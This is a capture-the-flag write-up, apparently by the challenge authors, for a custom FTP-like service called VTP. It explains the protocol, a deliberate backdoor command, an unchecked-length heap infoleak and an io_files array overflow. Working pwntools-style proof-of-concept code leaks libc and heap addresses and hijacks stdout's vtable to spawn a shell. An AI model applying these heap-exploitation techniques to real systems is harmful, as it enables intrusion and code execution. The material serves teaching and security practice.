# VTP1 & VTP2 Writeup

VTP means vulnerable transfer protocol. It contains a private protocol implementing part of FTP commands and a filesystem designed by ourself. 

VTP1 and VTP2 shares the same binary and the binary is running on Ubuntu 16.04. For VTP1,  you have to get the first flag by reversing the binary and find out the backdoor. For VTP2,  you have to exploit the bug in the binary and then get shell to find the second flag.  

## VTP1

### Protocol Design

The protocol we designed is described as follows. The magic number is `0xdd`,  and data_length is represented in `big-endian`.  After that is `data`.  At the end of payload,  there is a crc32 of `data`.

```
| magic  | data_length(big endian) | data | check_sum |
| ------ | ----------------------  | ---- | --------- |
```

To make the challenge more interesting,  we define 5 types of `variable` used in the protocol `data`. `Variable` starts with a byte called `info`. `Info` will indicates the type of `variable` and other variable type specified information. 

Detailed Design of `variable` can be described as follows.

```
 bits[0:3] - types

 types:
  1. bool
      bits[3] - value 0 or 1
  2. string
      null terminated
  3. raw
      bits[3] - short raw (0) or long raw (1)
      if short raw
          bits[4:8] - length
      elif long raw 
          bits[4:8] - length of length
  4. int
      bits[4] - endian (0 for little-endian and 1 for big-endian)
      bits[5:8] - length
  5. list
      bits[3:8] - length of length

``` 

For example, 0x9(0b1001) means the data type is boolean and the value is True. Further,  for `raw` if it is a short raw(bits[3]==0),  then bits[4:8] represented the length of `raw` data.  If not, then bits[4:8] represented the length of `raw` data length.

After `variable` is known, we should know how to use `variable` to send a VTP command.

Firstly there are 12 types of command implemented like FTP showed as follows.

```
enum zeroftp_cmd_type {
    ZEROFTP_LOGIN = 1,
    ZEROFTP_LS,
    ZEROFTP_CD,
    ZEROFTP_MKDIR,
    ZEROFTP_RMDIR,
    ZEROFTP_RDFILE,
    ZEROFTP_WRFILE,
    ZEROFTP_RMFILE,
    ZEROFTP_FILEINFO,
    ZEROFTP_SETFILEINFO,
    ZEROFTP_BACKDOOR,
    ZEROFTP_QUIT,
};
```

For example, if you want to send a ZEROFTP_LOGIN command,  `data` should starts with a `command_type` which is represented by `int variable` and its value is `1`. Following the `command_type` is `username(string)` and `password(raw)`.

You can check The following whole VTP commands specification.

```
LOGIN 		: command_type(int) + username(string) + password(raw)
LS 			: command_type(int) + filename(string)
CD 			: command_type(int) + dirname(string)
MKDIR 		: command_type(int) + dirname(string)
RMDIR 		: command_type(int) + dirname(string)
RDFILE 		: command_type(int) + filename(string)
WRFILE 		: command_type(int) + filename(string) + file_content(raw)
RMFILE 		: command_type(int) + filename(string)
FILEINFO 	: command_type(int) + filename(string) + fileinfo_type(int, optional)
SETFILEINFO : command_type(int) + filename(string) + fileinfo_type(int) + fileinfo(string or int)
BACKDOOR 	: command_type(int) + filename(string)
```

## Backdoor

Now to get the flag of VTP1,  you should use `BACKDOOR` command. `BACKDOOR` will read the file which is specified by the filename in the VTP command, in the server's real filesystem  and write the content to the self-made fs. But as you know, flag is stored as `here_is_your_flag/flag`, so you have to use `MKDIR` to make a directory called `here_is_your_flag` in the self-made fs before using `BACKDOOR`. Afterwards use `RDFILE` and get your first flag of VTP!

### Exploit

Here is PoC for VTP1

```
zeroftp_login('admin', 'admin')
zeroftp_mkdir('here_is_your_flag')
zeroftp_backdoor("here_is_your_flag/flag")
flag = zeroftp_rdfile("here_is_your_flag/flag")
log.info('get the flag:{}'.format(flag))
```

## VTP2

For challenge 2, you're preferred to get shell to get the second flag. There are two intended bugs lies on the binary.

### Infoleak (bug1)

The first one is, when unpacking `variable`, VTP won't check whether the length of `variable` will exceed the `data`, which means when you send a `variable`, you can set the length in `info` longer than the real following data length.

For example, we can send a `raw` as follows.

```
b4 00 00 10 00 00 41 41 41 41
```

But how to exploit the bug? Just use `WRFILE`, and forge the file content(`raw`) as above. Then VTP will write the filecontent containing `AAAA` and other data lies on heap behind `data`. Then we will get a infoleak after using `RDFILE`.

Here is the PoC for infoleak. Heap address and libc address can be leaked.

```
def leak():
    zeroftp_login('admin', 'admin')

    zeroftp_wrfile('X'*0x100, 'x'*0x100)
    zeroftp_rmfile('X'*0x100)

    payload  = zero_pack_int(0x7, endian='big')
    payload += zero_pack_string('Y'*8)
    # raw
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 3)
    len_len = (len(bin(0xf0)[2:])-1)/8+1
    raw_len= pack(0xf0, 8*len_len, endian='little')
    info = BITS_SET_VAL(info, 3, 4, 1)
    info = BITS_SET_VAL(info, 4, 8, len_len)
    payload += chr(info)
    payload += raw_len
    payload += 'bbbbbbbb'
    zero_send(payload)
    ret = zero_recv()

    ret = zeroftp_rdfile('Y'*8)
    libc.address = u64(ret[0x2a:][:8]) - 0x3c4b98
    heap = u64(ret[0x2a+8:][:8]) - 0x470
    log.info(hex(libc.address))
    log.info(hex(heap))
    zeroftp_rmfile('Y'*0x8)
    return libc.address, heap
```

### buffer overflow (bug2)

The other intended one is that a buffer overrun will be invoked if you opened enough files and don't close them.

Before explaining details about this bug, we should have a little knowledge of some important structures of the self-made filesystem(The structures defined in our self-made filesystem are similar to those of popular filesystems). 

Those structures are listed as follows. For each file,  VTP use `struct fnode_t` to record its attributes and use `zerofs_state->io_files` to record all of the opened file descriptor.

```
typedef struct fnode_t {
    union {
        struct fnode_t *child;
        long int inumber;
    } info;
    perm_t perm;
    file_t type;
    time_t createTime;
    time_t modifyTime;
    long int userId;
    struct fnode_t *parent;
    struct fnode_t *brother;
    char *name;
} fnode_t;

typedef struct IOFile {
    long int cur;
    fnode_t *fnode;
    int flags;
} IOFile;

typedef struct {
    long int userId;
    char *username;
    zerofs_disk *disk;
    fnode_t *root;
    fnode_t *pwd;
    IOFile *io_files[FD_MAX];
} zerofs_state;
```

Now here is the pseudocode of the buggy function. 

```
__int64 __fastcall insert_IOFile_4056D5(__int64 a1)
{
  int fd; // [rsp+14h] [rbp-4h]

  for ( fd = 0; state->io_files[fd]); ++fd )
    ;
  state->io_files[fd] = io_file;
  return fd;
}
```

Here fd is used as index of `state->io_files` to store `IOFILE` structure pointers. So if we create enough files and dont't close them, state->io_files buffer will be overflowed and `IOFILE` structure pointer will be written to the next chunks on the heap(state->io_files lies on heap).

Before exploiting the bug, we still need a command which won't close fd. Yeah, It's `RDFILE`.

Now by using `RDFILE` continuously, io_file will be written to the area that was originally zero.

### Exploit

Since the field `brother` of `fnode_t` may be zero, we can try to overwrite it with `IOFILE` structure pointer.

After opened 0x2e files, the next opening file operation will lead to the first file's fnode's `brother` field being written as io_file pointer, which means we are able to forge a fnode now. Since the size of `IOFILE` is 0x20 and the size of `fnode_t` is 0x50, we can forge the first 0x20 bytes of fnode by controling `IOFILE` and forge the next 0x30 bytes by controling the following chunk's content. Luckily, the following 0x30 bytes is the head of "root fnode". 

But how to get an arbitrary writing? My idea is to control `name` field of the forged fnode and then rename the file relating to the forged fnode. It's easy to control field `name` by using `setfileinfo('/', 5, 0xdeadbeefdeadbeef)` where `5` means modifytime, one arttribute of the file. 

Now we have realized arbitrary write and have the knowledge of the libc address and heap address. Just prepare a `_IO_jump_t` filled with `magic system` on heap and overwrite `vtable` field of stdout to point to the forged vtable to get shell.

PoC is showed as follows. 

```
for i in xrange(0x2e):
    zeroftp_wrfile('%08d' % i, 'x'*0x10)
for i in xrange(0x1e):
    zeroftp_rdfile('%08d' % (i+0x10))

zeroftp_wrfile('%08d' % 0x2e, p64(libc.address+0x4526a)*32)
zeroftp_rdfile('%08d' % 0x2e)

zeroftp_setfileinfo('/', 2 , heap + 0x110)
zeroftp_setfileinfo('/', 4 , 0)
zeroftp_setfileinfo('/', 5 , libc.address+0x3c56f8)
zeroftp_setfileinfo(p64(libc.address+0x3c36e0)[:6], 0, p64(heap+0x1b90))

```


[exp.py](https://github.com/ZhangZhuoSJTU/MyCTF/blob/master/2018/0CTF_Final/zeroftp/exp.py) 
[source code](https://github.com/ZhangZhuoSJTU/MyCTF/tree/master/2018/0CTF_Final/zeroftp)
